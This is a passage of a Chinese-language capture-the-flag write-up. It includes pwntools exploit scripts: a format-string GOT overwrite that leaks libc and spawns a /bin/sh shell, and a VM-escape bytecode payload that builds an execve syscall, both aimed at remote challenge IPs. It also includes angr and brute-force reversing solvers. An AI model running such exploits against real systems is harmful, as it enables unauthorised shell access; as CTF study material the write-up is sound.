                print
                p.close()
                break
            else:
                p.close()
        except:
            p.close()
利用脚本跑出来是在第6个位置会回显，然后利用printf_got的地址来leak printf的实际地址，
而后根据leak到的printf的实际地址来判断目标系统上使用的libc库，这里利用LibcSearcher来确定，如下图所示：  
这里使用了libc6-i386_2.23-0ubuntu10_amd64的libc库，而后即可计算system的地址，最后再利用格式化字符串的任意地址写的特性，将printf_got的地址修改为system地址即可。  
exp:
    #!/usr/bin/python
    from pwn import *
    #libc = ELF('/lib/i386-linux-gnu/libc.so.6')
    libc = ELF('./00.CTF/Tools/LibcSearcher/libc-database/db/libc6-i386_2.23-0ubuntu10_amd64.so')
    elf = ELF('./pwn')
    #p = process('./pwn')
    #p = remote('127.0.0.1', 9999)
    p = remote('106.75.126.184', 58579)
    context.log_level = 'debug'
    def get_addr(addr):
        p.recvuntil("Do you know repeater?\n")
        payload = p32(addr) + '%6$s'
        p.sendline(payload)
        data = p.recv()
        print data
        return u32(data[4:4+4])
    def main():
        printf_got = elf.got['printf']
        printf_addr = get_addr(printf_got)
        #get_addr(read_got)
        print "[+] Got printf address -> {}".format(hex(printf_addr))
        system_addr = libc.symbols['system'] - libc.symbols['printf'] + printf_addr
        print "[+] Got system address -> {}".format(hex(system_addr))
        payload = fmtstr_payload(6, {printf_got: system_addr})
        #p.recvuntil('\n')
        p.sendline(payload)
        p.recvuntil('\n')
        p.sendline('/bin/sh\x00')
        p.interactive()
    if __name__ == '__main__':
        main()
最终获得的flag如下：  
#### **0x06 Hvm**
由测试可知，当输入长度大于52时（算入回车），出现crash  
根据crash可定位到切换虚拟机eip的位置  
定位对应堆地址，栈和eip的全局变量:
    0x7ffff7ff3fc0 内存写入地址，payload地址
    内存值          变量名           变量偏移地址
    0x7ffff7ff5000 current_buf      0x555555756100
    0x7ffff7ff5000 curren_buf_start 0x5555557560f8
    0x7ffff7ff4000 stack_base       0x5555557560d0
                   stack            0x5555557560b8
    0x7ffff7ff3000 mmap_0x2000      0x5555557560e0
生成payload：
    syscall_eip = (__int64)syscall_eip_start + 4 * ((signed int)re(pop stack) + 3);
控制eip栈地址距离payload地址的偏移
    0x7ffff7ff3ff4 - 0x7ffff7ff3fc0 = 0x34 = 52
第一个eip偏移
    syscall_eip = (((target - syscall_eip_start) >> 2)-3) = (((0x7ffff7ff3fc0 - 0x7ffff7ff5000) >> 2)-3) = 9xFFFFFBED
第二个eip偏移，前52个字节无法填充payload，所以再次跳转
    syscall_eip = (((target - syscall_eip_start) >> 2)-3) = (((0x7ffff7ff4000 - 0x7ffff7ff5000) >> 2)-3) = 0xFFFFFBFD
栈偏移
    stack_offset = (target_base_stack - mmap_0x2000)/4 = (0x7ffff7ff3500 - 0x7ffff7ff3000) / 4 = 0x140
payload:
    13 00 00 00                base_stack = (re(pop stack) * 4) + mmap_0x2000 = mmap_0x2000+0x500
    12 00 00 00                stack = base_stack
    07 00 00 00 ff ff fb fd    push FFFFFBFD
    06 00 00 00                syscall_eip= syscall_eip_start+ 4 * ((signed int)re(pop stack) + 3);
    ff ff fb ed s              tack指向这边， 用来计算syscall_eip偏移
    00 00 01 40 00 00 01 40    用来计算栈偏移
    07 00 00 00 2f 73 68 00    push /bin
    07 00 00 00 2f 62 69 6e    push /sh
    0d 00 00 00                syscall_rdi = stack
    1a 00 00 00 00 00 00 00    syscall_rsi = (signed int)re(*(_DWORD *)curren_buf);
    01 00 00 00 00 00 00 3b    syscall_rax = (signed int)re(*(_DWORD *)curren_buf);
    04 00 00 00 00 00 00 00    syscall_rdx = (signed int)re(*(_DWORD *)curren_buf);
    0e 00 00 00                syscall
exp:
    4.Exp:
    from pwn import *
    #context.log_level = 'debug'
    #p = process("./hvm")
    p = remote("117.50.4.173", 10315)
    payload = "\x13\x00\x00\x00\x12\x00\x00\x00\x07\x00\x00\x00\xff\xff\xfb\xfd\x06\x00\x00\x00"
    payload = payload + 'A' * (52 - len(payload))
    payload = payload + "\xff\xff\xfb\xed\x00\x00\x01\x40\x00\x00\x01\x40\x07\x00\x00\x00\x2f\x73\x68\x00\x07\x00\x00\x00\x2f\x62\x69\x6e\x0d\x00\x00\x00\x1a\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x3b\x04\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x00\x00"
    p.sendafter("hello\n", payload)
    p.interactive()
这题后来看到看雪上还有更简单的解法
## **Reverse**
#### **0x07 Martricks**
使用angr，先ida反汇编得到  
成功路径find=0x400A84  
失败路径：avoid=0x400A90  
代码如下：
    import angr
    def main():
        p = angr.Project("martricks")
        simgr = p.factory.simulation_manager(p.factory.full_init_state())
        simgr.explore(find=0x400A84, avoid=0x400A90)
        return simgr.found[0].posix.dumps(0).strip('\0\n')
    if __name__ == '__main__':
    print main()
运行得到flag:  
#### **0x08 Give_a_try**
根据反汇编的结果编写如下代码，其中2个注意点是：  
1、srand的值需要动态调试确定下其初始值  
2、以42个字符的和值为遍历，发现其值都有：3681
    const int BUFF_LEN = 255*50*50;
    int * pbuff=NULL;
    unsigned int dword_4030B4[42] = {
    0x63B25AF1,0x0C5659BA5,0x4C7A3C33,0x0E4E4267,0x0B611769B,
    0x3DE6438C,0x84DBA61F,0x0A97497E6,0x650F0FB3,0x84EB507C,
    0x0D38CD24C,0x0E7B912E0,0x7976CD4F,0x84100010,0x7FD66745,
    0x711D4DBF,0x5402A7E5,0x0A3334351,0x1EE41BF8,0x22822EBE,
    0x0DF5CEE48,0x0A8180D59,0x1576DEDC,0x0F0D62B3B,0x32AC1F6E,
    0x9364A640,0x0C282DD35,0x14C5FC2E,0x0A765E438,0x7FCF345A,
    0x59032BAD,0x9A5600BE,0x5F472DC5,0x5DDE0D84,0x8DF94ED5,
    0x0BDF826A6,0x515A737A,0x4248589E,0x38A96C20,0x0CC7F61D9,
    0x2638C417,0x0D9BEB996 };
    unsigned int hack_one(int a1,int a2)
    {
        __asm {
                mov eax, dword ptr[esp + 8]
                movzx   ecx, byte ptr[esp +12]
                mul     ecx
                mov     ecx, 0FAC96621h
                push    eax
                xor     edx, edx
                div     ecx
                pop     eax
                push    edx
                mul     eax
                div     ecx
                mov     eax, edx
                mul     edx
                div     ecx
                mov     eax, edx
                mul     edx
                div     ecx
                mov     eax, edx
                mul     edx
                div     ecx
                mov     eax, edx
                mul     edx
                div     ecx
                mov     eax, edx
                mul     edx
                div     ecx
                mov     eax, edx
                mul     edx
                div     ecx
                mov     eax, edx
                mul     edx
                div     ecx
                mov     eax, edx
                mul     edx
                div     ecx
                mov     eax, edx
                mul     edx
                div     ecx
                mov     eax, edx
                mul     edx
                div     ecx
                mov     eax, edx
                mul     edx
                div     ecx
                mov     eax, edx
                mul     edx
                div     ecx
                mov     eax, edx
                mul     edx
                div     ecx
                mov     eax, edx
                mul     edx
                div     ecx
                mov     eax, edx
                mul     edx
                div     ecx
                mov     eax, edx
                pop     edx
                mul     edx
                div     ecx
                mov eax, edx            
        }
    }
    int main()
    {
        pbuff = new int [BUFF_LEN];
        for (int sum = 42; sum < 255 * 42; sum++)
        {
            srand(sum^0x31333359);
            for (int j = 0; j < 42; j++)
                pbuff[sum*42 + j]= rand();
        }
        for (int num = 0; num <42; num++)
        {
            for (int i = 0; i <255; ++i)
            {
                for (int sum = 42; sum < 255 * 42; sum++)
                {   
                    if (hack_one(pbuff[sum * 42 + num],i) == dword_4030B4[num] && sum==3681)
                    {
                        printf("%c",i);
                    }   
                }
            }
        }
        printf("\nend\n");
        return 0;
    }
最后得到flag: